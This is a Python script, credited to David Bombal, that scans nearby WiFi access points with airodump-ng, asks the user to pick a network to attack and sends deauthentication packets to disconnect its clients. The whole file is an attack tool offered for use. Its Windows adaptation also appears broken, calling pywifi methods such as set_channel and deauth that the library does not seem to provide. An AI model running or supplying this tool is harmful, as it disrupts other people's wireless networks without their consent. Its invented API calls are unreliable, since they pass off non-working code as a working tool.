import os
import time
import csv
import shutil
from datetime import datetime
import pywifi
from pywifi import const
import subprocess

active_wireless_networks = []

def check_for_essid(essid, lst):
    check_status = True

    if len(lst) == 0:
        return check_status

    for item in lst:
        if essid in item["ESSID"]:
            check_status = False

    return check_status

print(r"""______            _     _  ______                 _           _ 
|  _  \          (_)   | | | ___ \               | |         | |
| | | |__ ___   ___  __| | | |_/ / ___  _ __ ___ | |__   __ _| |
| | | / _` \ \ / / |/ _` | | ___ \/ _ \| '_ ` _ \| '_ \ / _` | |
| |/ / (_| |\ V /| | (_| | | |_/ / (_) | | | | | | |_) | (_| | |
|___/ \__,_| \_/ |_|\__,_| \____/ \___/|_| |_| |_|_.__/ \__,_|_|""")
print("\n****************************************************************")
print("\n* Copyright of David Bombal, 2021                              *")
print("\n* https://www.davidbombal.com                                  *")
print("\n* https://www.youtube.com/davidbombal                          *")
print("\n****************************************************************")

wifi = pywifi.PyWiFi()
iface_list = wifi.interfaces()
if len(iface_list) == 0:
    print("Please connect a WiFi adapter and try again.")
    exit()

print("The following WiFi interfaces are available:")
for index, iface in enumerate(iface_list):
    print(f"{index} - {iface.name()}")

while True:
    wifi_interface_choice = input("Please select the interface you want to use for the attack: ")
    try:
        if int(wifi_interface_choice) in range(len(iface_list)):
            break
    except:
        print("Please enter a number that corresponds with the choices available.")

hacknic = iface_list[int(wifi_interface_choice)]

print("WiFi adapter connected!\nNow let's kill conflicting processes.")

# On Windows, there is no need for "airmon-ng check kill" command.

print("Putting Wifi adapter into monitored mode:")
iface = hacknic
iface.disconnect()  # Disconnect from any connected network

iface_name = hacknic.name() + "mon"
subprocess.run(["netsh", "interface", "set", "interface", iface_name, "admin=enable"])
time.sleep(1)  # Wait for the virtual interface to be created and enabled

try:
    discover_access_points = subprocess.Popen(["airodump-ng", "--write-interval", "1", "--output-format", "csv", "-w", "file", iface_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(5)  # Wait for a few seconds to capture access points
    discover_access_points.terminate()
except KeyboardInterrupt:
    pass

for file_name in os.listdir():
    if ".csv" in file_name:
        with open(file_name) as csv_h:
            csv_h.seek(0)
            csv_reader = csv.reader(csv_h)
            for row in csv_reader:
                if len(row) > 12 and check_for_essid(row[13], active_wireless_networks):
                    active_wireless_networks.append({
                        "BSSID": row[0].strip(),
                        "channel": row[3].strip(),
                        "ESSID": row[13].strip()
                    })

try:
    while True:
        os.system("cls" if os.name == "nt" else "clear")
        print("Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n")
        print("No |\tBSSID              |\tChannel|\tESSID                         |")
        print("___|\t___________________|\t_______|\t______________________________|")
        for index, item in enumerate(active_wireless_networks):
            print(f"{index}\t{item['BSSID']}\t{item['channel']}\t\t{item['ESSID']}")
        time.sleep(1)

except KeyboardInterrupt:
    print("\nReady to make choice.")

while True:
    choice = input("Please select a choice from above: ")
    try:
        if active_wireless_networks[int(choice)]:
            break
    except:
        print("Please try again.")

hackbssid = active_wireless_networks[int(choice)]["BSSID"]
hackchannel = active_wireless_networks[int(choice)]["channel"]

# On Windows, set the channel directly using pywifi
iface = hacknic
iface.set_channel(int(hackchannel))

# Deauthenticate clients using "pywifi"
wifi = pywifi.PyWiFi()
iface = wifi.interfaces()[int(wifi_interface_choice)]
scan_result = iface.scan_results()
target_bssid = hackbssid
target_auth = None
for ap in scan_result:
    if ap.bssid == target_bssid:
        target_auth = ap
        break

if target_auth is not None:
    # Start deauthentication
    iface.deauth(target_auth, 5)  # Send 5 deauthentication packets

print("Deauthentication attack completed.")
